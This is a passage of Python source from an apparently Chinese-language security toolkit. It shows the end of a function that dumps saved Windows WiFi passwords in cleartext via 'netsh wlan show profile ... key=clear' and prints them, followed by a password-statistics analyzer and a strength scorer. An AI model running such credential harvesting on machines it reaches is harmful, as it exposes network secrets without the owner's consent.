                        if len(parts) >= 2:
                            name = parts[1].strip()
                            if name and name != '':
                                profiles.append(name)

            if not profiles:
                print_warning("未找到WiFi配置文件")
                result["error"] = "No profiles found"
                return result

            print_info(f"找到 {len(profiles)} 个WiFi配置文件")

            if ssid:
                # 只提取指定SSID
                profiles = [p for p in profiles if ssid.lower() in p.lower()]
                if not profiles:
                    print_warning(f"未找到SSID包含 '{ssid}' 的配置文件")
                    return result
                print_info(f"过滤后: {len(profiles)} 个匹配配置文件")

            headers = ["序号", "SSID", "密码", "认证方式"]
            rows = []

            for i, profile in enumerate(profiles, 1):
                try:
                    cmd = f'netsh wlan show profile name="{profile}" key=clear'
                    stream = os.popen(cmd)
                    detail = stream.read()
                    stream.close()

                    password = ""
                    auth = ""

                    for line in detail.split('\n'):
                        if '关键内容' in line or 'Key Content' in line:
                            password = line.split(':')[1].strip()
                        if '身份验证' in line or 'Authentication' in line:
                            auth = line.split(':')[1].strip()

                    profile_info = {
                        "ssid": profile,
                        "password": password,
                        "auth": auth,
                    }
                    result["profiles"].append(profile_info)
                    rows.append([str(i), profile, password if password else "(隐藏)", auth])

                except Exception as e:
                    rows.append([str(i), profile, f"(读取失败: {e})", ""])

            result["total"] = len(result["profiles"])

            if rows:
                print()
                print_table(headers, rows, color=Colors.CYAN)

                # 统计
                with_pwd = sum(1 for r in result["profiles"] if r.get("password"))
                print(f"\n{Colors.BOLD}统计:{Colors.RESET}")
                print(f"  总配置文件: {len(profiles)}")
                print(f"  已获取密码: {Colors.GREEN}{with_pwd}{Colors.RESET}")
                print(f"  未获取密码: {Colors.RED}{len(profiles) - with_pwd}{Colors.RESET}")

                print_success(f"WiFi密码提取完成，共 {len(profiles)} 个配置文件")
            else:
                print_warning("未获取到WiFi密码信息")

        except Exception as e:
            print_error(f"WiFi密码提取失败: {e}")
            result["error"] = str(e)

        return result

    # ==================== 10. 密码分析器 ====================

    def password_analyzer(self, passwords):
        """
        密码分析器 - 分析一批密码的统计特征和安全性
        """
        print_section("密码分析器")
        print_info(f"正在分析 {len(passwords)} 个密码...")

        result = {
            "total": len(passwords),
            "unique": 0,
            "length_stats": {},
            "character_stats": {},
            "strength_distribution": {},
            "common_patterns": {},
            "top_passwords": [],
            "security_score": 0,
        }

        try:
            if not passwords:
                print_warning("密码列表为空")
                return result

            unique_passwords = list(set(passwords))
            result["unique"] = len(unique_passwords)

            lengths = [len(p) for p in unique_passwords]
            length_counter = Counter(lengths)
            result["length_stats"] = {
                "min": min(lengths),
                "max": max(lengths),
                "avg": round(sum(lengths) / len(lengths), 2),
                "median": sorted(lengths)[len(lengths) // 2],
                "distribution": dict(length_counter),
            }

            # 字符类型统计
            char_types = {
                "has_lower": 0,
                "has_upper": 0,
                "has_digit": 0,
                "has_special": 0,
                "only_digits": 0,
                "only_letters": 0,
            }
            for pwd in unique_passwords:
                if re.search(r'[a-z]', pwd): char_types["has_lower"] += 1
                if re.search(r'[A-Z]', pwd): char_types["has_upper"] += 1
                if re.search(r'\d', pwd): char_types["has_digit"] += 1
                if re.search(r'[!@#$%^&*()_\-+=<>?/\\|~`{}\[\].,;:\'\" ]', pwd): char_types["has_special"] += 1
                if re.match(r'^\d+$', pwd): char_types["only_digits"] += 1
                if re.match(r'^[a-zA-Z]+$', pwd): char_types["only_letters"] += 1

            total = len(unique_passwords)
            result["character_stats"] = {
                k: {"count": v, "percentage": round(v / total * 100, 2)}
                for k, v in char_types.items()
            }

            # 强度分布
            strength_dist = {
                "very_weak": 0,
                "weak": 0,
                "medium": 0,
                "strong": 0,
                "very_strong": 0,
            }
            for pwd in unique_passwords:
                score = self._quick_score(pwd)
                if score < 20:
                    strength_dist["very_weak"] += 1
                elif score < 40:
                    strength_dist["weak"] += 1
                elif score < 60:
                    strength_dist["medium"] += 1
                elif score < 80:
                    strength_dist["strong"] += 1
                else:
                    strength_dist["very_strong"] += 1

            result["strength_distribution"] = {
                k: {"count": v, "percentage": round(v / total * 100, 2)}
                for k, v in strength_dist.items()
            }

            # 常见模式分析
            pattern_counts = Counter()
            for pwd in unique_passwords:
                for pattern, name in self.PASSWORD_PATTERNS:
                    if re.match(pattern, pwd):
                        pattern_counts[name] += 1
                        break
                else:
                    pattern_counts["其他"] += 1

            result["common_patterns"] = {
                k: {"count": v, "percentage": round(v / total * 100, 2)}
                for k, v in pattern_counts.most_common()
            }

            # Top 10最常见密码
            password_counter = Counter(passwords)
            result["top_passwords"] = password_counter.most_common(10)

            # 综合安全评分（0-100）
            score = 0
            avg_len = result["length_stats"]["avg"]
            if avg_len >= 12: score += 30
            elif avg_len >= 8: score += 20
            elif avg_len >= 6: score += 10

            special_pct = result["character_stats"]["has_special"]["percentage"]
            upper_pct = result["character_stats"]["has_upper"]["percentage"]
            digit_pct = result["character_stats"]["has_digit"]["percentage"]

            score += min(special_pct / 5, 20)
            score += min(upper_pct / 5, 15)
            score += min(digit_pct / 5, 15)

            weak_pct = result["strength_distribution"]["very_weak"]["percentage"] + \
                       result["strength_distribution"]["weak"]["percentage"]
            strong_pct = result["strength_distribution"]["strong"]["percentage"] + \
                         result["strength_distribution"]["very_strong"]["percentage"]
            score -= weak_pct / 5
            score += strong_pct / 5

            score = max(0, min(100, round(score)))
            result["security_score"] = score

            # ====== 打印结果 ======
            print(f"\n{Colors.BOLD}{Colors.UNDERLINE}基本统计{Colors.RESET}")
            print(f"  总密码数: {Colors.CYAN}{result['total']}{Colors.RESET}")
            print(f"  去重后:   {Colors.CYAN}{result['unique']}{Colors.RESET}")

            print(f"\n{Colors.BOLD}{Colors.UNDERLINE}长度统计{Colors.RESET}")
            print(f"  最短: {result['length_stats']['min']} 位")
            print(f"  最长: {result['length_stats']['max']} 位")
            print(f"  平均: {result['length_stats']['avg']} 位")
            print(f"  中位数: {result['length_stats']['median']} 位")

            print(f"\n{Colors.BOLD}{Colors.UNDERLINE}字符类型分布{Colors.RESET}")
            ch_headers = ["类型", "数量", "占比"]
            ch_rows = [
                ["包含小写", str(char_types["has_lower"]),
                 f"{result['character_stats']['has_lower']['percentage']}%"],
                ["包含大写", str(char_types["has_upper"]),
                 f"{result['character_stats']['has_upper']['percentage']}%"],
                ["包含数字", str(char_types["has_digit"]),
                 f"{result['character_stats']['has_digit']['percentage']}%"],
                ["包含特殊字符", str(char_types["has_special"]),
                 f"{result['character_stats']['has_special']['percentage']}%"],
                ["纯数字", str(char_types["only_digits"]),
                 f"{result['character_stats']['only_digits']['percentage']}%"],
                ["纯字母", str(char_types["only_letters"]),
                 f"{result['character_stats']['only_letters']['percentage']}%"],
            ]
            print_table(ch_headers, ch_rows, color=Colors.YELLOW)

            print(f"\n{Colors.BOLD}{Colors.UNDERLINE}强度分布{Colors.RESET}")
            st_headers = ["等级", "数量", "占比"]
            st_rows = []
            for level_key, (level_val, level_name, level_color) in self.STRENGTH_LEVELS.items():
                if level_key in result["strength_distribution"]:
                    data = result["strength_distribution"][level_key]
                    st_rows.append([level_name, str(data["count"]), f"{data['percentage']}%"])
            print_table(st_headers, st_rows, color=Colors.MAGENTA)

            print(f"\n{Colors.BOLD}{Colors.UNDERLINE}常见密码模式{Colors.RESET}")
            pat_headers = ["模式", "数量", "占比"]
            pat_rows = [
                [k, str(v["count"]), f"{v['percentage']}%"]
                for k, v in result["common_patterns"].items()
            ]
            print_table(pat_headers, pat_rows, color=Colors.CYAN)

            if result["top_passwords"]:
                print(f"\n{Colors.BOLD}{Colors.UNDERLINE}Top 10 最常见密码{Colors.RESET}")
                top_headers = ["排名", "密码", "出现次数"]
                top_rows = [
                    [str(i+1), pwd, str(count)]
                    for i, (pwd, count) in enumerate(result["top_passwords"])
                ]
                print_table(top_headers, top_rows, color=Colors.LIGHT_RED)

            # 综合安全评分
            score_color = Colors.GREEN if score >= 70 else (Colors.YELLOW if score >= 40 else Colors.RED)
            print(f"\n{Colors.BOLD}{Colors.UNDERLINE}综合安全评分{Colors.RESET}")
            print(f"  总分: {score_color}{score}/100{Colors.RESET}")
            bar_len = 40
            filled = int(bar_len * score / 100)
            bar = "█" * filled + "░" * (bar_len - filled)
            print(f"  [{score_color}{bar}{Colors.RESET}]")

            if score >= 70:
                print(f"  评价: {Colors.GREEN}密码安全状况良好{Colors.RESET}")
            elif score >= 40:
                print(f"  评价: {Colors.YELLOW}密码安全状况一般，建议改进{Colors.RESET}")
            else:
                print(f"  评价: {Colors.RED}密码安全状况较差，需要立即改进{Colors.RESET}")

            print_success("密码分析完成")

        except Exception as e:
            print_error(f"密码分析失败: {e}")
            result["error"] = str(e)

        return result

    # ==================== 内部辅助方法 ====================

    def _quick_score(self, password):
        """
        快速密码评分 - 用于批量分析
        """
        score = 0
        length = len(password)

        if length >= 16: score += 40
        elif length >= 12: score += 30
        elif length >= 8: score += 20
        elif length >= 6: score += 10

        if re.search(r'[a-z]', password): score += 10
        if re.search(r'[A-Z]', password): score += 10
        if re.search(r'\d', password): score += 10
        if re.search(r'[!@#$%^&*()_\-+=<>?/\\|~`{}\[\].,;:\'\" ]', password): score += 15

        if password.lower() in self.COMMON_PASSWORDS:
            score -= 30

        return max(0, min(100, score))